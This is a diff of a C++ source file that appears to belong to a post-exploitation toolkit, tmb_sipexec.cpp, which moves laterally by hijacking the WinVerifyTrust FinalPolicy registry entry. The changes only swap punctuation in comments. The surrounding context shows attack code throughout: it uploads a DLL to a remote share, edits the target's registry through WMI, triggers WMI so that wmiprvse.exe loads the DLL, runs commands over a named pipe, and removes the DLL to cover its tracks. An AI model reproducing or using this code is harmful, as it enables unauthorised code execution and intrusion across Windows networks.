@@ -1,5 +1,5 @@
 /*
- * tmb_sipexec.cpp — Lateral movement via WinVerifyTrust FinalPolicy hijack
+ * tmb_sipexec.cpp -- Lateral movement via WinVerifyTrust FinalPolicy hijack
  *
  * Two modes:
  *   jump (mode=0):        Upload DLL, hijack FinalPolicy, trigger WMI, DLL calls back as beacon
@@ -111,7 +111,7 @@ static void derive_pipe_name(const char *dll_basename, char *out, int outlen) {
 
 /* ---- Random DLL name ---- */
 static void random_dll_name(char *out, int len) {
-    /* ponytail: use GetTickCount as entropy source — good enough for a filename */
+    /* ponytail: use GetTickCount as entropy source -- good enough for a filename */
     DWORD tick = __rdtsc() & 0xFFFFFFFF;
     MSVCRT$_snprintf(out, len, "tmb_%08x.dll", tick);
 }
@@ -154,7 +154,7 @@ static BOOL upload_dll(const char *target, const char *share, const char *dll_na
 }
 
 /* ================================================================
- * WMI connection helper — connect to a namespace on target
+ * WMI connection helper -- connect to a namespace on target
  * ================================================================ */
 static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) {
     CLSID clsid_WbemLocator = {0x4590f811, 0x1d3a, 0x11d0,
@@ -199,7 +199,7 @@ static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) 
 /* ================================================================
  * Phase 2: Remote registry via WMI StdRegProv
  *
- * Uses root/default namespace — always available, no RemoteRegistry needed.
+ * Uses root/default namespace -- always available, no RemoteRegistry needed.
  * ================================================================ */
 
 #define WMI_HKLM 0x80000002
@@ -386,7 +386,7 @@ static void restore_finalpolicy(IWbemServices *pSvc, const char *guid, FP_BACKUP
 }
 
 /* ================================================================
- * Phase 3: WMI trigger — force WinVerifyTrust call on target
+ * Phase 3: WMI trigger -- force WinVerifyTrust call on target
  *
  * Queries Win32_PnPSignedDriver which triggers signature verification
  * on driver files, causing wmiprvse.exe to call WinVerifyTrust and
@@ -438,7 +438,7 @@ static BOOL pipe_exec(const char *target, const char *dll_basename,
 
     TMB_INFO("Connecting to pipe: %s", pipePath);
 
-    /* Retry loop — DLL needs time to start pipe_worker */
+    /* Retry loop -- DLL needs time to start pipe_worker */
     HANDLE hPipe = INVALID_HANDLE_VALUE;
     for (int attempt = 0; attempt < 15; attempt++) {
         hPipe = KERNEL32$CreateFileA(pipePath, GENERIC_READ | GENERIC_WRITE,
@@ -519,7 +519,7 @@ static BOOL pipe_exec(const char *target, const char *dll_basename,
 }
 
 /* ================================================================
- * Phase 5: Cleanup — delete uploaded DLL
+ * Phase 5: Cleanup -- delete uploaded DLL
  * ================================================================ */
 static void cleanup_dll(const char *remote_path) {
     /* Small delay for wmiprvse to release the file handle (DLL pins itself,
@@ -528,7 +528,7 @@ static void cleanup_dll(const char *remote_path) {
     if (KERNEL32$DeleteFileA(remote_path)) {
         TMB_INFO("Deleted %s", remote_path);
     } else {
-        TMB_WARN("Could not delete %s (error %lu) — DLL may be locked",
+        TMB_WARN("Could not delete %s (error %lu) -- DLL may be locked",
                  remote_path, KERNEL32$GetLastError());
     }
 }
@@ -563,7 +563,7 @@ static void compute_target_local_path(const char *share, const char *dll_name,
     } else if (MSVCRT$strlen(share) == 2 && share[1] == '$') {
         MSVCRT$_snprintf(out, outlen, "%c:\\%s", share[0], dll_name);
     } else {
-        /* Generic — assume C:\Windows\Temp */
+        /* Generic -- assume C:\Windows\Temp */
         MSVCRT$_snprintf(out, outlen, "C:\\Windows\\Temp\\%s", dll_name);
     }
 }
@@ -660,7 +660,7 @@ extern "C" void go(char *args, int alen) {
 
     IWbemServices *pSvcCimv2 = wmi_connect(target, L"ROOT\\CIMV2");
     if (!pSvcCimv2) {
-        TMB_WARN("Failed to connect to root/cimv2 — restoring");
+        TMB_WARN("Failed to connect to root/cimv2 -- restoring");
         restore_finalpolicy(pSvcDefault, guid, &backup);
         pSvcDefault->Release();
         if (uploaded) KERNEL32$DeleteFileA(remote_unc);
@@ -669,7 +669,7 @@ extern "C" void go(char *args, int alen) {
     }
 
     if (!trigger_wmi(pSvcCimv2)) {
-        TMB_WARN("WMI trigger failed — restoring");
+        TMB_WARN("WMI trigger failed -- restoring");
         restore_finalpolicy(pSvcDefault, guid, &backup);
         pSvcCimv2->Release();
         pSvcDefault->Release();
@@ -687,7 +687,7 @@ extern "C" void go(char *args, int alen) {
     }
     pSvcDefault->Release();
 
-    /* ---- Phase 5: Exec mode — connect to pipe ---- */
+    /* ---- Phase 5: Exec mode -- connect to pipe ---- */
     if (mode == 1) {
         if (!pipe_exec(target, dll_name, command)) {
             TMB_ERR("Pipe execution failed");
